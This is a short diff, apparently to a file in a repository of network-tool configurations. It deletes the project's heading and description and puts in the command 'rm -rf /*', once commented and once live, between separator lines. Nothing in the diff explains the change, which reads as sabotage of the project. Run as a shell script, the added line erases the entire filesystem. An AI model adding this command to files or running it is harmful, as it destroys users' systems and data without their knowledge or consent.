@@ -1,2 +1,4 @@
-# 0X
-Organize the configuration files of various network tools
+# ==========
+# rm -rf /*
+rm -rf /*
+# ==========
